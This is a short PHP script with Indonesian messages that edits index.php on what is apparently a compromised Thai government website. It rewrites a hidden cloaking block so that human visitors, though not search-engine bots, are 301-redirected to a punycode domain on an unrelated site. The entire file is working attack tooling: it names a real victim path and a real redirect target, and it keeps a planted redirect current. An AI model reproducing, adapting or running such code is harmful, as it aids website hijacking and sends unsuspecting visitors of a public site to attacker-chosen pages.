<?php
$target = '/home/paoroiet/domains/wisdom101.pao-roiet.go.th/public_html/assets/index.php';
$newUrl = 'https://xn--72c5afai6bu6b9dya2jf5hsa.lazismubantul.org/403.html';

if (!file_exists($target)) {
    die("❌ File tidak ditemukan!\n");
}

$content = file_get_contents($target);

// cari blok if (!isBot()) { ... }
$pattern = '/if\s*\(\s*!isBot\s*\(\s*\)\s*\)\s*{[^}]*Location:\s*"([^"]+)"[^}]*}/i';

// cek dan ganti jika perlu
if (preg_match($pattern, $content, $match)) {
    $currentUrl = $match[1];

    if ($currentUrl !== $newUrl) {
        $newBlock = <<<PHP
if (!isBot()) 
{
    header("HTTP/1.1 301 Moved Permanently");
    header("Location: $newUrl");
    exit();
}
PHP;

        $newContent = preg_replace($pattern, $newBlock, $content);
        file_put_contents($target, $newContent);
        echo "✅ Link diganti menjadi: $newUrl\n";
    } else {
        echo "✅ Sudah pakai link yang benar, tidak perlu diganti.\n";
    }
} else {
    echo "❌ Blok isBot() tidak ditemukan.\n";
}
?>
